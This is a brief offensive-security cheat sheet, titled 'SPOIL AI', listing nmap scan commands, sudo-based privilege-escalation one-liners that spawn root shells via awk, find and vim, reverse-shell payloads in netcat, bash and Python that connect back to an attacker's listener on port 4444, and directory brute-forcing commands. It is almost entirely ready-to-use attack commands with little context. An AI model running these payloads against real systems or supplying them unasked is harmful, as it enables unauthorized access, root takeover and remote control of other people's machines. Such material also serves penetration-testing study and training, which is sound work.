# SPOIL AI - Cybersecurity Core Manual

## 1. Network Reconnaissance (Nmap)
* **Ping Sweep (No Port Scan):** `nmap -sn 192.168.1.0/24` (Used to find live hosts quickly).
* **Stealth SYN Scan:** `nmap -sS -p- -T4 <IP>` (Scans all 65535 ports quietly and quickly).
* **Aggressive Scan:** `nmap -A -T4 -p <ports> <IP>` (Detects OS, versions, and runs default scripts. Highly noisy).
* **Vulnerability Scan:** `nmap --script vuln -p <ports> <IP>` (Checks open ports for known CVEs).

## 2. Dangerous Commands & Privilege Escalation (GTFOBins)
These commands are highly dangerous if they possess SUID permissions or allow `sudo` execution without a password, as they allow users to break out of restricted shells or escalate to root.
* **Find SUID Binaries:** `find / -perm -4000 -type f 2>/dev/null`
* **Find Writable Directories:** `find / -writable -type d 2>/dev/null`
* **awk (Root Shell):** If `awk` can run as sudo: `sudo awk 'BEGIN {system("/bin/sh")}'`
* **find (Root Shell):** If `find` can run as sudo: `sudo find . -exec /bin/sh \; -quit`
* **vim (Root Shell):** If `vim` can run as sudo: `sudo vim -c ':!/bin/sh'`

## 3. Reverse Shells (Payloads)
If you need to connect a target machine back to your attacking machine (listener on port 4444).
* **Netcat (nc):** `nc -e /bin/sh <attacker_ip> 4444` (If nc has the -e flag compiled).
* **Netcat (mkfifo):** `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> 4444 >/tmp/f`
* **Bash:** `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1`
* **Python:** `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

## 4. Web Enumeration
* **Directory Brute-forcing (Gobuster):** `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`
* **Fast Fuzzing (ffuf):** `ffuf -w /path/to/wordlist -u http://<IP>/FUZZ`
